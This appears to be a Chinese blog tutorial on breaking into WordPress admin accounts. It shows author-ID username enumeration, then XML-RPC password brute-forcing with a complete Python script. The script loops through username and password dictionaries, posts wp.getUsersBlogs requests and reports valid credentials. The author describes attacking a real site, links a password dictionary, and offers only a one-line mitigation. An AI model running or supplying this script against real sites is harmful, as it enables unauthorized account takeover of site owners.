首先要说一下，一个正常点的网站，你用暴力破解登录的话，都是几乎无法实现的，举个例子。
### 举个暴力破解QQ的例子：
	
> - 1.你暴力破解QQ密码，输入错误几次之后验证码也出来了。
> - 2.验证码的问题比较好搞，找个识图的代码，识别图片中的二维码，即可。继续破解。
> - 3.是的 二维码可以搞定，但是你输入错误次数超过30次之后，该账号24小时内再提交密码都无效了。

### 举个我自己亲测暴力破解wordpress站点管理员密码的例子：
我穷举wordpress 的账户密码，post到xxx.com/wp-admin.php上，结果：没几下我就发现网站打不开了。然后，用同事们的机器，也是打不开，我以为网站挂了，结果不是，我发现用3G网可以打开。看样wordpress直接屏蔽了我们的ip段，一个小时后又可以访问了。 所以我放弃了，对wp-admin.php的破解。

只能另辟蹊径。

----------
## 1.wordpress自带的 **author漏洞**。

wooyun曾经爆出的WordPress的一个bug，就是再主网址尾部追加/?author=index之后可以爆出user表中的id==index的账户名。
#  
比如： **http://xxx.com/?author?=1** 
查看网页源代码：
``` html
<html xmlns="http://www.w3.org/1999/xhtml">
<head>


    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>admin | 此处隐藏网站名</title>
	<!--  重点在这里 -->
``` 

比如： **http://xxx.com/?author?=2** 
查看网页源代码：
``` html
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta name="generator" content="WordPress 3.8.3" />
<meta name="robots" content="noodp,noydir" />

    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


    <title>Nothing found for  ?author=2</title>
    <!--  重点在这里 -->
```
# 
ok，此处可以看出该站只有一个管理员 用户名是**admin**。
那么好了，我们暴力破解本来还需要猜用户名的，现在用户名不用猜了，只要猜密码，我们就省了很多事。

# 
## 2.wordpress自带的 **XMLRPC漏洞**。

wordpress官网对这个功能进行了解释：  [点击跳转到wordpress官网](http://codex.wordpress.org/XML-RPC_wp#wp.getUsersBlogs)
	
如下是我摘抄的一段：
# 
wp.getUsersBlogs

	检索用户的博客。
参数
	
	用户名的字符串
	字符串密码
返回值
	> - 数组
		 > - +    结构
	 - 布尔型 isAdmin
	 - 字符串 url
	 - 文章的 blogid 的字符串
	 - 字符串 blogName
	 - 字符串 xmlrpc

wp.getTags

	得到所有标记的列表。

...
...
...
# 
我就不在往下写了，下面的也是调用这个接口传递用户名，密码，传递其他参数用于获得一些数据的一些表，比如文章列表之类的。

从wordpress官网看其他的一些功能，可以看出这个xmlrpc应该是开放给客户端使用的。



# 
那么我们在wordpress主站地址后追加：**/xmlrpc.php**即可得到如下截图：
![](https://leanote.com/api/file/getImage?fileId=563cd1cb38f411249a000669)
**XML-RPC server accepts POST requests only**.
是告诉我们需要用post方式提交。

从这个文件名xmlrpc的命名来看，这里应该是提交xml格式的才对。
我们来试下模拟post提交，来验证我们的猜想：
# 
上图：
![](https://leanote.com/api/file/getImage?fileId=563cd1cb38f411249a00066b)

这里报了一个错误，说转换出错，很显然post提交不了。跟wordpress官网说的一样，这个接口需要提交xml格式的。

格式 的例子如下：
``` xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
   <param><value>username</value></param>
   <param><value>password</value></param>
  </params>
</methodCall>
```
我试着在chrome里提交一下：
![](https://leanote.com/api/file/getImage?fileId=563cdfc138f41125df00074f)
这个接口已经走通了，为了测试这个接口如果出错不会被服务器拉黑ip，我刷新了20次，确定这个接口可用。终于放心了唉。

下面就是写个python程序，进行循环post xml进行验证了。


``` python

#  佛祖保留代码无bug 
'''
漏洞详情请查看：http://www.freebuf.com/articles/web/38861.html
'''
import urllib2
import re

def ReadMe():
    print """说明：
    1.在本文件同目录下新建usernames.txt、passwords.txt分别存入用户名、密码字典
    2.按提示输入WordPress站点(例如:www.freebuf.com)
    """

def GetUrl():
    urlinput=raw_input("请输入wordpress站点:")
    requrl="http://"+re.match(r"(http://)?(.*)",urlinput).expand('\g<2>')+"/xmlrpc.php"
    print "尝试利用:"+requrl
    return requrl
   
def Aviable(requrl):
    
    try:
        result = urllib2.urlopen(url=requrl).read()
    except urllib2.URLError:
        print "抱歉，此站点漏洞不可用"
        return False
    else :
        if result == "XML-RPC server accepts POST requests only.":
            print "\n该站点存在此漏洞,尝试破解中:"
            return True
        else :
            print "抱歉，此站点漏洞不可用"
            print "网页返回：\n    "+result
            return False
    
def Exploit():
    requrl=GetUrl()
    if Aviable(requrl) :
    #usernames.txt 文件中其实只有一个用户名，因为我们通过author漏洞获取到了管理的用户名。
        f_username=open("usernames.txt","r")
        f_password=open("passwords.txt","r")
        num=0
        Flag=0
        for name in f_username:
            if Flag == 1:
                break
            for key in f_password:
                if num % 10 == 0:
                    print "已尝试"+str(num)+"个"
                if len(key)<8:
                    continue #wordpress管理员密码长度最短是8  所以这里小于8的跳过
                reqdata='<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs\
                        </methodName><params><param><value>'+ name + \
                        '</value></param><param><value>'+ key  +\
                        '</value></param></params></methodCall>'
                req = urllib2.Request(url=requrl,data=reqdata)
                result = urllib2.urlopen(req).read()
                num=num+1
                if "isAdmin" in result :
                    print "Got it !"
                    print "username :"+name+"password :"+key
                    Flag = 1
                    break
                    
                elif "faultString" and "403" in result :
                    continue 
                    
                else :
                    print "Unknown error"
        print "抱歉，在此字典中并未找到正确的密码"
        
if __name__ == '__main__' :
    ReadMe()
    Exploit()

```

# 
执行效果如下：

![](https://leanote.com/api/file/getImage?fileId=563cd4d638f411249a000681)



# 
wordpress不知道现在已经到了什么版本了，但是目前，这个漏洞还是存在的，避免这个漏洞方式很简单，关闭这个功能即可。
# 
PS：
	 补充点：有些人觉得自己的字典不够全，我这里共享一个别人的密码集合：
[点击跳转](http://www.xdowns.com/soft/8/114/2012/Soft_88561.html)



